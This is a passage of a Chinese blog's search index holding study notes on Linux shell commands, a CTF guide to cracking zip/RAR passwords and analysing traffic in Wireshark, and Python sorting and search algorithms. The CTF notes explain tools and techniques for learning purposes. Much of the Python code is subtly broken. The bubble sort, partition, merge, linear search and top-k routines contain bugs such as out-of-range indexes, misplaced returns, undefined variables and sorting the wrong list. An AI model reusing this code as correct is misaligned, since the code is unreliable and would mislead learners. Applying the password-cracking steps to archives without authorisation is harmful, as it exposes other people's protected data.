class="lvl-2"><p>-l：使得ls命令列出一个显示文件和目录的详细信息的列表</p><p>每一个文件或目录都有对应的详细信息</p><p><mark>如文件权限：drwxr-xr-x之类</mark></p></li><li class="lvl-2"><p>-h：以Ko，Mo，Go的形式显示文件大小</p><p><mark>ls -l</mark>，列出的文件详细信息中，文件大小是以字节为单位的</p><p>参数==-h==，h是humain readable的缩写，表示“适合人类阅读的”</p></li><li class="lvl-2"><p>-t：按文件最近一次修改时间排序</p><p>t是time的缩写，表示“时间”</p><p>ls的常用参数合并在一起使用，效果是叠加的：<mark>ls -lath</mark></p></li></ul><blockquote><ul class="lvl-1"><li class="lvl-2"><p>Linux中，以点（.）开头的文件是隐藏文件</p></li><li class="lvl-2"><p>不包括开头的两个 <mark>.</mark> 和 <mark>…</mark> ，这两个的含义如下：</p></li><li class="lvl-2"><p><mark>.</mark>  (一个点）表示当前目录；<mark>…</mark>（两个点）表示上一级目录</p></li></ul></blockquote><h2 id="cd命令">cd命令</h2><ul class="lvl-0"><li class="lvl-2"><p>cd 是英语 change directory的缩写，表示“切换目录”</p></li><li class="lvl-2"><p>cd命令后面接的参数就是一个：去的那个目录的路径</p></li><li class="lvl-2"><p>要返回上一级目录：<mark>cd …</mark></p></li><li class="lvl-2"><p>进入当前目录：<mark>cd .</mark></p></li><li class="lvl-2"><p>连续退回两个父目录：<mark>cd …/…</mark></p></li><li class="lvl-2"><p>回到根目录：<mark>cd /</mark> 或 <mark>cd ~</mark></p></li><li class="lvl-2"><p>相对路径：相对当前目录的一个路径表示法</p></li><li class="lvl-2"><p>绝对路径：绝对的，不因当前目录而改变的一个路径表示法</p><p>总是以 ==/<mark>开头，</mark>/==表示根目录</p></li><li class="lvl-2"><p>重回家目录的三种办法</p><ul class="lvl-2"><li class="lvl-4">cd /home/username，username可替换为你的用户名</li><li class="lvl-4">cd ~</li><li class="lvl-4">cd，不加任何参数</li></ul></li></ul><blockquote><p>路径自动补充：</p><ul class="lvl-1"><li class="lvl-2">Tab键可以进行命令的补充（按两下Tab键）</li><li class="lvl-2">其实Tab键还可以用于路径的补全</li></ul></blockquote><h2 id="du命令">du命令</h2><ul class="lvl-0"><li class="lvl-2"><p>显示目录包含的文件大小</p></li><li class="lvl-2"><p>相比ls -l命令，du命令统计的才是真正的文件大小</p></li><li class="lvl-2"><p>du命令会深入遍历每个目录的子目录，统计所有文件的大小</p></li><li class="lvl-2"><p>du是英语disk usage的缩写，表示“磁盘使用/占用”</p></li><li class="lvl-2"><p>适合人类阅读的文件大小命令：<mark>du -h</mark></p></li><li class="lvl-2"><p>-a：显示文件和目录的大小</p></li><li class="lvl-2"><p>-s：只显示总计大小</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc的基本解题思路(二)</title>
      <link href="/posts/e560.html"/>
      <url>/posts/e560.html</url>
      
        <content type="html"><![CDATA[<p><strong>misc的四大部分：</strong></p><ul class="lvl-0"><li class="lvl-2">文件操作与隐写</li><li class="lvl-2">图片隐写术</li><li class="lvl-2">压缩文件处理</li><li class="lvl-2">流量取证技术</li></ul><h2 id="压缩文件处理">压缩文件处理</h2><h3 id="压缩文件分析">压缩文件分析</h3><ol><li class="lvl-3"><p><strong>伪加密</strong></p><p>如果压缩文件是加密的，或文件头正常但解压缩错误，首先尝试文件是否为伪加密。zip文件是否加密是通过识别符来显示的，在每个文件的文件目录字段有一位专门标识了文件是否加密，将其设置为00表示</p><p><mark>使用场景：伪加密文件</mark></p><p><code>操作方法：使用winhex打开压缩文件，找到文件头第九第十个字符，将其修改为0000.</code></p><ol><li class="lvl-6"><p>使用winhex打开文件搜索16进制504B0102，可以看到每个加密文件头字段</p></li><li class="lvl-6"><p>从50开始计算，第九第十个字符为加密字段，将其设置为0000即为可变成无加密状态</p></li><li class="lvl-6"><p>RAR文件由于有头部校验，使用伪加密打开文件会出现报错，使用winhex修改标志位后如报错消失且正常解压缩，说明是伪加密。使用winhex打开RAR文件，找到第24个字节，该字节尾数为4表示加密，0表示无加密，将尾数改为0即可破解伪加密。</p></li></ol></li><li class="lvl-3"><p><strong>暴力破解</strong></p><p>通常可以使用ARCHPR.exe工具来破解zip文件</p><p><mark>使用场景：Windows下加密过的zip文件</mark></p><ol><li class="lvl-6"><p>攻击类型选择暴力破解，在范围位置根据提示选择暴力破解范围选项设置暴力破解包含的类型，开始于和结束于选项具体范围，如果没有定义则全范围暴力破解。</p><p><code>点击打开选择要破解的文件，点击开始进行破解。建议使用1~9位的数字密码，以及系统自带的英文字典作为密码字典</code></p></li><li class="lvl-6"><p>攻击类型选择掩码可以进行复杂的暴力破解，比如知道密码前3位是<mark>abc</mark>，后3位为数字，则在攻击类型选择掩码，在掩码处输入<mark>abc???</mark>，暴力范围选项选择所有数字，打开要破解的点击，点击破解。此时==???==的部分会被我们选择的暴力破解范围中字符代替。</p></li></ol></li><li class="lvl-3"><p><strong>明文攻击</strong></p><p>明文攻击指知道加密的ZIP中部分文件的明文内容，利用这些内容推测出密钥并解密ZIP文件方法，相比于暴力破解，这种方法在破解密码较为复杂的压缩包时效率更高。</p><p><mark>使用场景：已知加密的ZIP部分文件明文内容</mark></p><p>例：假设一个加密的压缩包中有两个文件readme.txt和flag.txt，其中flag.txt的内容是我们希望知道的内容，而我们拥有readme.txt的明文文件，使用上述两个文件即可进行明文攻击。</p><p><code>操作：</code></p><p><code>1、将readme.txt的明文文件进行压缩，变成readme1.zip</code></p><p><code>2、打开archpr，攻击类型选择明文，明文文件路径选择readme1.zip（即将明文文件不加密压缩后的文件），加密的文件</code></p><p><code>选择要破解的文件，点击开始，破解成功后会获得密码。</code></p><blockquote><p>使用该方法需要注意两个关键点：</p><p>1、有一个明文文件，压缩后CRC值与加密压缩包中的文件一致。</p><p>2、明文文件的压缩算法需要与加密压缩文件的压缩算法一致。</p></blockquote><p><strong>RAR文件格式</strong></p><p><mark>有时候给出的RAR文件的头部各个字块会会故意给错误导致无法识别。</mark></p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202302020003592.png" alt="RAR文件格式"></p></li></ol><h2 id="流量取证技术">流量取证技术</h2><p>CTF比赛中，<mark>流量包的取证分析</mark>是另一项重要的考察方向。</p><p>通常比赛中会提供一个包含流量数据的PCAP文件，有时候也会需要选手们先进行修复或重构传输文件后，再进行分析。</p><ul class="lvl-0"><li class="lvl-2"><p>总体把握</p><ul class="lvl-2"><li class="lvl-4">协议分级</li><li class="lvl-4">端点统计</li></ul></li><li class="lvl-2"><p>过滤筛选</p><ul class="lvl-2"><li class="lvl-4">过滤语法</li><li class="lvl-4">Host，Protocol，contains，特征值</li></ul></li><li class="lvl-2"><p>发现异常</p><ul class="lvl-2"><li class="lvl-4">特殊字符串</li><li class="lvl-4">协议某字符</li><li class="lvl-4">flag位于服务器中</li></ul></li><li class="lvl-2"><p>数据提取</p><ul class="lvl-2"><li class="lvl-4">字符串取</li><li class="lvl-4">文件提取</li></ul></li></ul><p><mark>总的来说比赛中的流量分析可以概括为以下三个方向：</mark></p><ul class="lvl-0"><li class="lvl-2"><p>流量包修复</p></li><li class="lvl-2"><p>协议分析</p></li><li class="lvl-2"><p>数据提取</p></li></ul><h3 id="流量数据包文件分析">流量数据包文件分析</h3><p><strong>WireShark工具的基本使用</strong></p><p>wirkshark的过滤器和过滤规则能够帮助我们迅速定位到要分析的报文。</p><p><mark>常用的过滤命令：</mark></p><ol><li class="lvl-3"><p>过滤IP，如源IP或者目标 x.x.x.x</p><p><code>ip.src eq x.x.x.x or ip.dst eq x.x.x.x 或者 ip.addr eq x.x.x.x</code></p></li><li class="lvl-3"><p>过滤端口</p><p><code>tcp.port eq 80 or udp.port eq 80</code></p><p><code>tcp.dstport == 80</code>    只显示tcp协议的目标端口为80</p><p><code>tcp.srcport == 80</code>    只显示tcp协议的源端口为80</p><p><code>tcp.port &gt;= 1 and tcp.port &lt;= 80</code></p></li></ol><p><strong>WireShark协议分析技巧：</strong></p><ol><li class="lvl-3"><p>查看网络协议：统计 -&gt; 协议分级</p></li><li class="lvl-3"><p>根据数据包特征进行筛选</p><p>右键 -&gt; 作为过滤器应用 -&gt; 选中</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202303072340671.png" alt=""></p></li><li class="lvl-3"><p>WireShark流汇聚</p><p>在关注的http数据包或tcp数据包中选择流汇聚，可以将HTTP流或TCP流汇聚或还原成数据，在弹出的框中可以看到数据内容。</p></li></ol><blockquote><p>常见的HTTP流关键内容：</p><ol><li class="lvl-3">HTML中直接包含重要信息</li><li class="lvl-3">上传或下载文件内容，通常包含文件名、hash值等关键信息，常用POST请求上传</li><li class="lvl-3">一句话木马，POST请求，内容包含eval，内容使用base64加密</li></ol></blockquote><p><strong>WireShark数据提取</strong></p><ol><li class="lvl-3"><p>使用WireShark可以自动提取通过http传输的文件内容</p><p><mark>文件 -&gt; 导出对象 -&gt; HTTP</mark></p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202303111906811.png" alt=""></p></li><li class="lvl-3"><p>WireShark可以手动提取文件内容</p><p>点击想要的数据包，选定内容 的位置，右键 -&gt; 导出分组字节流，或者点击菜单栏 文件 -&gt; 导出分组字节流，快捷方式Ctrl + H，在弹出的框中将文件保存成二进制文件。</p></li></ol><blockquote><p>免责声明：本文章涉及的知识和技能仅用于学习研究，如有用于非法途径或未被授权的真实网络环境，所造成的后果自行承担，责任与本文作者无关，倡导把安全知识和技能用于正当、正规、正义的途径。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构与算法中的排序算法(一)</title>
      <link href="/posts/6547.html"/>
      <url>/posts/6547.html</url>
      
        <content type="html"><![CDATA[<h2 id="列表排序">列表排序</h2><ul class="lvl-0"><li class="lvl-2"><p>排序：将一组“无序”的记录序列调整为“有序”的记录序列</p></li><li class="lvl-2"><p>列表排序：将无序列表变为有序列表</p><ul class="lvl-2"><li class="lvl-4">输入：列表</li><li class="lvl-4">输出：有序列表</li></ul></li><li class="lvl-2"><p>升序与降序</p></li><li class="lvl-2"><p>内置排序函数：<mark>sort()</mark></p></li></ul><h2 id="冒泡排序-Bubble-Sort">冒泡排序(Bubble Sort)</h2><ul class="lvl-0"><li class="lvl-2"><p>列表每两个相邻的数，如果前面比后面大，则交换这两个数</p></li><li class="lvl-2"><p>一趟排序完成后，则无序区减少一个数，有序区增加一个数</p></li><li class="lvl-2"><p>代码关键点：趟、无序区范围</p></li></ul><p><strong>代码示例</strong>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import randomdef bubble_sort(li):    for i in range(len(li)-1):  # 第i趟        for j in range(len(li)-i):            if li[j]&gt;li[j+1]:                li[j],li[j+1]=li[j+1],li[j]#验证li = [random.randint(0,10000) for i in range(1000)]print(li)bubble_sort(li)print(li)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul class="lvl-0"><li class="lvl-2"><p>时间复杂度：O(n<sup>2</sup>)</p></li></ul><p><mark>冒泡排序-优化</mark>：</p><ul class="lvl-0"><li class="lvl-2"><p>如果冒泡排序中的一趟排序没有发生交换，则说明列表已经有序，可以直接结束算法。</p></li></ul><p><strong>代码示例</strong>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">def bubble_sort(li):    for i in range(len(li)-1):        exchange = False        for j in range(len(li)-i-1):            if li[j] &gt; li[j+1]:                li[j], li[j+1] = li[j+1], li[j]                 exchange = True            if not exchange:                return<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul class="lvl-0"><li class="lvl-2"><p>时间复杂度：O(n<sup>2</sup>)</p></li></ul><h2 id="选择排序-Select-Sort">选择排序(Select Sort)</h2><ul class="lvl-0"><li class="lvl-2"><p>一趟排序记录最小的数，放到第一个位置</p></li><li class="lvl-2"><p>再一趟排序记录列表无序最小的数，放到第二个位置</p></li><li class="lvl-2"><p>…</p></li><li class="lvl-2"><p>算法关键点：有序和无序区、无序区最小数的位置</p></li></ul><p><strong>代码示例：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">def select_sort(li):    for i in range(len(li)-1):        min_loc = i        for j in range(i+1,len(li)):            if li[j] &lt; li[min_loc]:                min_loc = j        if min_loc != i:            li[i], li[min_loc] = li[min_loc], li[i]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="插入排序-Inset-Sort">插入排序(Inset Sort)</h2><ul class="lvl-0"><li class="lvl-2"><p>初始时手里（有序区）只有一张牌</p></li><li class="lvl-2"><p>每次（从无序区）摸一张牌，插入到手里已有牌的正确位置</p></li></ul><p><strong>代码示例：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">def insect_sort(li):    for i in range(1,len(li)):        tmp = li[i]        j = i - 1        while j &gt;= 0 and tmp &lt; li[j]:            li[j+1] = li[j]            j = j - 1         li[j+1] = tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul class="lvl-0"><li class="lvl-2"><p>时间复杂度：O(n<sup>2</sup>)</p></li></ul><h2 id="快速排序-Quick-Sort">快速排序(Quick Sort)</h2><ul class="lvl-0"><li class="lvl-2"><p>快速排序：<mark>快</mark></p></li><li class="lvl-2"><p>快速排序思路：</p><ul class="lvl-2"><li class="lvl-4">取一个元素p（第一个元素），使元素p归位；</li><li class="lvl-4">列表被p分成两部分，左边都比p小，右边都比p大；</li><li class="lvl-4">递归完成排序</li></ul></li></ul><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202302062134346.png" alt=""></p><p><strong>快速排序-框架：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">def quick_sort(data,left,right):    if left &lt; right:        mid = partition(data,left,right)        quick_sort(data,left,mid-1)        quick_sort(data,mid+1,right)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>代码示例：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">def partition(li,left,right):    tmp = li[left]    while left &lt; right:        while li[right] &gt;= tmp:  # 从右边找比tmp小的数            right -= 1  # 往左走一步        li[left] = li[right]  # 把右边的值写到左边空位上        while left &lt; right and li[left] &lt;= tmp:            left += 1        li[left] = tmp  # 把tmp归位        return leftdef quick_sort(li,left,right)    :    if left &lt; right:  # 至少两个元素        mid = partition(li,left,right)        quick_sort(li,left,mid-1)        quick_sort(li,mid+1,right)#调用测试li = [5,7,6,3,1,2,9,8]quick_sort(li,0,len(li)-1)print(li)  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul class="lvl-0"><li class="lvl-2"><p>快速排序的效率：</p><ul class="lvl-2"><li class="lvl-4">快速排序的时间复杂度：<mark>O(nlogn)</mark></li></ul></li><li class="lvl-2"><p>快速排序的问题</p><ul class="lvl-2"><li class="lvl-4"><p>最坏情况：</p><p>正序或逆序排列，二叉树画出来应该是一棵斜树，并且需要经过n-1次递归调用才能完成，且第i次划分需要经过n‐i次关键字的比较才能找到第i个记录，也就是枢轴的位置，所以：</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202302091721179.png" alt=""></p><p>最终的时间复杂度应该O(n<sup>2</sup>)</p></li><li class="lvl-4"><p>递归：消耗一部分系统资源</p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构与算法中的排序算法(三)</title>
      <link href="/posts/3541.html"/>
      <url>/posts/3541.html</url>
      
        <content type="html"><![CDATA[<h2 id="归并排序">归并排序</h2><h3 id="归并">归并</h3><ul class="lvl-0"><li class="lvl-2"><p>假设现在的列表分两段，如何将其合成一个有序列表</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202302191523668.png" alt="归并排序"></p></li><li class="lvl-2"><p>这种操作称为一次归并</p></li></ul><h3 id="使用归并">使用归并</h3><ul class="lvl-0"><li class="lvl-2"><p>分解：将列表越分越小，直至分成一个元素</p></li><li class="lvl-2"><p>终止条件：一个元素是有序的</p></li><li class="lvl-2"><p>合并：将两个有序列表归并，列表越来越大</p></li></ul><p><strong>代码示例：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">def merge(li,low,high):    i = low    j = mid + 1    ltmp = []    while i&lt;mid and j&lt;=high:  # 只要左右两边都有数        if li[i] &lt; li[j]:            ltmp.append(li[i])            i += 1        else:            ltmp.append(li[j])            j += 1    # while执行完，肯定有一部分没数了    while i &lt;= mid:        ltmp.append(li[i])        i += 1    while j &lt;= high:        ltmp.append(li[i])        j += 1    li[low:high+1] = ltmp            def merge_sort(li,low,hight):    if low &lt; high:  # 至少有两个元素，递归        mid = (low + high) // 2        merge_sort(li,low,mid)        merge_sort(li,mid+1,high)        merge(li,low,mid,high)        #测试li = list(range(1000))import randomrandom.shuffle(li)print(li)merge_sort(li,0,len(li)-1)print(li)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul class="lvl-0"><li class="lvl-2"><p><mark>时间复杂度：O(nlogn)</mark></p></li><li class="lvl-2"><p>空间复杂度：O(n)</p></li></ul><h2 id="小结">小结</h2><ul class="lvl-0"><li class="lvl-2"><p>三种排序算法的时间复杂度都是O(nlogn)</p></li><li class="lvl-2"><p>一般情况下，就运行时间而言：</p><ul class="lvl-2"><li class="lvl-4">快速排序 &lt; 归并排序 &lt; 堆排序</li></ul></li><li class="lvl-2"><p>三种排序算法的缺点：</p><ul class="lvl-2"><li class="lvl-4">快速排序：极端情况下排序效率低</li><li class="lvl-4">归并排序：需要额外的内存开销</li><li class="lvl-4">堆排序：在快的排序算法中相对较慢</li></ul></li></ul><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202302191554786.png" alt="小结"></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构与算法中的排序算法(二)</title>
      <link href="/posts/a5e3.html"/>
      <url>/posts/a5e3.html</url>
      
        <content type="html"><![CDATA[<h2 id="堆排序前传-树与二叉树">堆排序前传 - 树与二叉树</h2><h3 id="树">树</h3><ul class="lvl-0"><li class="lvl-2"><p>树是一种数据结构</p></li><li class="lvl-2"><p>树是一种可以递归定义的数据结构</p></li><li class="lvl-2"><p>树是由几个节点组成的集合</p><ul class="lvl-2"><li class="lvl-4">如果n=0，那这是一棵空树；</li><li class="lvl-4">如果n&gt;0，那存在1个节点作为树的根节点，其他节点可以分为m个集合，每个集合本身又是一棵树。</li></ul></li></ul><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202302092044487.png" alt="树的数据结构"></p><ul class="lvl-0"><li class="lvl-2"><p>一些概念</p><ul class="lvl-2"><li class="lvl-4">根节点、叶子节点</li><li class="lvl-4">树的深度（高度）</li><li class="lvl-4">树的度</li><li class="lvl-4">孩子节点/父节点</li><li class="lvl-4">子树</li></ul></li></ul><h3 id="二叉树">二叉树</h3><ul class="lvl-0"><li class="lvl-2"><p>二叉树：度不超过2的树</p></li><li class="lvl-2"><p>每个节点最多有两个孩子节点</p></li><li class="lvl-2"><p>两个孩子节点被区分为左孩子节点和右孩子节点</p></li></ul><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202302092100182.png" alt="二叉树的数据结构"></p><h3 id="完全二叉树">完全二叉树</h3><ul class="lvl-0"><li class="lvl-2"><p>满二叉树：一个二叉树，如果每个层的结点数都达到最大值，则这个二叉树就是满二叉树。</p></li><li class="lvl-2"><p>完全二叉树：叶节点只能出现在最下和次下层，并且最下面一层的结点都集中在该层最左边的若干位置的二叉树。</p></li></ul><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202302092105198.png" alt="完全二叉树的图示"></p><h3 id="二叉树的存储方式">二叉树的存储方式</h3><ul class="lvl-0"><li class="lvl-2"><p>二叉树的存储方式（表示方式）</p><ul class="lvl-2"><li class="lvl-4"><mark>链式存储方式</mark></li><li class="lvl-4"><mark>顺序存储方式</mark></li></ul></li></ul><h3 id="二叉树的顺序存储方式">二叉树的顺序存储方式</h3><p><mark>如图所示</mark></p><ul class="lvl-0"><li class="lvl-2"><p>父节点和左孩子节点的编号下标有什么关系？</p><ul class="lvl-2"><li class="lvl-4">0-1 1-3 2-5 3-7 4-9</li><li class="lvl-4">i-&gt;2i+1</li></ul></li><li class="lvl-2"><p>父节点和右孩子节点的编号下标有什么关系？</p><ul class="lvl-2"><li class="lvl-4">0-2 1-4 2-6 3-8 4-10</li><li class="lvl-4">i-&gt;2i+2</li></ul></li></ul><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202302092117768.png" alt="二叉树的顺序存储方式"></p><h2 id="堆排序">堆排序</h2><h3 id="什么是堆">什么是堆</h3><ul class="lvl-0"><li class="lvl-2"><p>堆：一种特殊的完全二叉树结构</p><ul class="lvl-2"><li class="lvl-4">大根堆：一棵完全二叉树，满足任一节点都比其孩子节点大</li><li class="lvl-4">小根堆：一棵完全二叉树，满足任一节点都比其孩子节点小</li></ul></li></ul><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202302092129845.png" alt="大根堆和小根堆"></p><h3 id="堆的向下调整性质">堆的向下调整性质</h3><ul class="lvl-0"><li class="lvl-2"><p>假设根节点的左右子树都是堆，但根节点不满足堆的性质</p></li><li class="lvl-2"><p>可以通过一次向下的调整来将其变成一个堆</p></li></ul><h3 id="堆排序过程">堆排序过程</h3><ul class="lvl-0"><li class="lvl-2"><p>1.建立堆</p></li><li class="lvl-2"><p>2.得到堆顶元素，为最大元素</p></li><li class="lvl-2"><p>3.去掉堆顶，将堆最后一个元素放到堆顶，此时可通过一次调整重新使堆有序</p></li><li class="lvl-2"><p>4.堆顶元素为第二大元素</p></li><li class="lvl-2"><p>5.重复步骤3，直到堆变空</p></li></ul><p><strong>代码示例：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">def sift(li,low,high):    # li：列表    # low：堆的根节点位置    # high：堆的最后一个元素的位置    i = low  # i最开始指向根节点    j = 2 * i + 1  # j开始是左孩子    tmp = li[low]  # 把堆顶存起来    while j &lt;= high:  # 只要j位置有数        if j + 1 &lt;= high and li[j+1] &gt; li[j]:  # 如果右孩子有并且比较大            j = j + 1  # j指向右孩子        if li[j] &gt; tmp:            li[i] = li[j]            i = j  # 往下看一层            j = 2 * i + 1        else:  # tmp更大，把tmp放到i的位置上            li[i] = tmp  # 把tmp放到某一级领导位置上            break    else:        li[i] = tmp  # 把tmp放到叶子节点上        def heap_sort(li):    n = len(li)    for i in range((n-2)//2,-1,-1):        # i表示建堆的时候调整的部分的根下标        sift(li,i,n-1)    # 建堆完成了    for i in range(n-1,-1,-1):        # i指向当前堆的最后一个元素        li[0], li[i] = li[i], li[0]        sift(li,0,i-1)  # i-1是新的high<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul class="lvl-0"><li class="lvl-2"><p>时间复杂度：O(nlogn)</p></li></ul><h3 id="内置模块">内置模块</h3><ul class="lvl-0"><li class="lvl-2"><p>python内置模块–heapq</p></li><li class="lvl-2"><p>常用函数</p><ul class="lvl-2"><li class="lvl-4">heapify(x)</li><li class="lvl-4">heappush(heap,item)</li><li class="lvl-4">heappop(heap)</li></ul></li></ul><p><strong>代码示例：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import heapqimport randomli = list(range(100))random.shuffle(li)print(li)heapq.heapify(li)  # 建堆n = len(li)for i in range(n):    print(heapq.heappop(li),end=',')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="topk问题">topk问题</h3><ul class="lvl-0"><li class="lvl-2"><p>现在有n个数，设计算法得到前k大的数。（k&lt;n）</p></li><li class="lvl-2"><p>解决思路：</p><ul class="lvl-2"><li class="lvl-4">排序后切片      <mark>O(nlogn)</mark></li><li class="lvl-4">冒泡排序 选择排序 插入排序    <mark>O(mn)</mark></li><li class="lvl-4">堆排序思路   <mark>O(mlogn)</mark></li></ul></li></ul><blockquote><p>堆排序解决思路：</p><ul class="lvl-1"><li class="lvl-2">取列表前k个元素建立一个小根堆。堆顶就是目前第k大的数</li><li class="lvl-2">依次向后遍历原列表，对于列表中的元素，如果小于堆顶，则忽略该元素；如果大于堆顶，则将堆顶更换为该元素，并且对堆进行一次调整</li><li class="lvl-2">遍历列表所有元素后，倒序弹出堆顶</li></ul></blockquote><p><strong>代码示例：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">def sift(li,low,high):    # li：列表    # low：堆的根节点位置    # high：堆的最后一个元素的位置    i = low  # i最开始指向根节点    j = 2 * i + 1  # j开始是左孩子    tmp = li[low]  # 把堆顶存起来    while j &lt;= high:  # 只要j位置有数        if j + 1 &lt;= high and li[j+1] &lt; li[j]:              j = j + 1  # j指向右孩子        if li[j] &lt; tmp:            li[i] = li[j]            i = j  # 往下看一层            j = 2 * i + 1        else:  # tmp更大，把tmp放到i的位置上            li[i] = tmp  # 把tmp放到某一级领导位置上            break    else:        li[i] = tmp  # 把tmp放到叶子节点上        def topk(li,k):    heap = li[0:k]    for i in range((k-2)//2, -1, -1):        sift(heap,i,k-1)    # 1.建堆    for i in range(k,len(li)-1):        if li[i] &gt; heap[0]:            heap[0] = li[i]            sift(heap,0,k-1)    # 2.遍历    for i in range(k-1, -1, -1):        li[0], li[i] = li[i], li[0]        sift(li,0,i-1)    # 3.出数    return heap# 测试                   import randomli = list(range(1000))random.shuffle(li)print(topk(li,10))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构与算法中的列表查找</title>
      <link href="/posts/4c50.html"/>
      <url>/posts/4c50.html</url>
      
        <content type="html"><![CDATA[<h2 id="查找">查找</h2><ul class="lvl-0"><li class="lvl-2"><p>查找：在一些数据元素中，通过一定的方法找出与给定关键字相同的数据元素的过程</p></li><li class="lvl-2"><p>列表查找（线性表查找）：从列表中查找指定元素</p><ul class="lvl-2"><li class="lvl-4">输入：列表、待查找元素</li><li class="lvl-4">输出：元素下标（未找到元素时一般返回None或-1）</li></ul></li><li class="lvl-2"><p>内置列表查找函数：index()</p></li></ul><h2 id="顺序查找-Linear-Search">顺序查找(Linear Search)</h2><ul class="lvl-0"><li class="lvl-2"><p>顺序查找：也叫线性查找，从列表第一个元素开始，顺序进行搜索，直到找到元素或搜索到列表最后一个元素为止</p></li><li class="lvl-2"><p>时间复杂度：O(n)</p></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">def linear_search(li,val):    for ind ,v in emumerate(li):        if v == val:            return ind        else:            return None#或者def linear_search(data_set,value):    for i in range(range(data_set)):        if data_set[i] == value:            return i     return <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二分查找-Binar-Search">二分查找(Binar Search)</h2><ul class="lvl-0"><li class="lvl-2"><p>二分查找：又叫折半查找，从有序列表的初始候选区 li[0:n] 开始，通过对待查找的值与候选区中间值的比较，可以使候选区减少一半</p></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">def binary_search(li,val):   # val：元素    left = 0    right = len(li) - 1    while left &lt;= right:# 候选区有值        mid = (left + right)// 2        if li[mid] == val:            return mid        elif li[mid] &gt; val: # 带查找的值在mid左侧            right = mid -1        else:   # li[mid] &lt; val 带查找的值在mid右侧            left = mid + 1      else:             return None<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul class="lvl-0"><li class="lvl-2"><p>时间复杂度：O(logn)</p></li></ul><p><mark>测试运行时间代码</mark>：</p><pre 